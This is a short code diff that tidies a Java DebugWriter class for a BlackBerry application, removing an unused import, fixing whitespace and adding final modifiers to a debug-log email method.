@@ -9,8 +9,6 @@
  * *************************************************/
 package blackberry.utils;
 
-import java.util.Vector;
-
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
 
@@ -23,7 +21,7 @@ public final class DebugWriter extends Thread {
     static final String SD_PATH = Path.SD_PATH + FILE_NAME;
     static final String FLASH_PATH = Path.USER_PATH + FILE_NAME;
     private static final long SLEEP_TIME = 1000;
-    
+
     private static final int MAX_NUM_MESSAGES = 1000;
 
     private static AutoFlashFile fileDebug;
@@ -137,9 +135,9 @@ public final class DebugWriter extends Thread {
     }
 
     //#ifdef SEND_LOG
-    public synchronized boolean sendLogs(String email) {
+    public synchronized boolean sendLogs(final String email) {
         //byte[] content = fileDebug.read();
-        boolean ret = fileDebug.sendLogs(email);
+        final boolean ret = fileDebug.sendLogs(email);
         createNewFile();
 
         return ret;
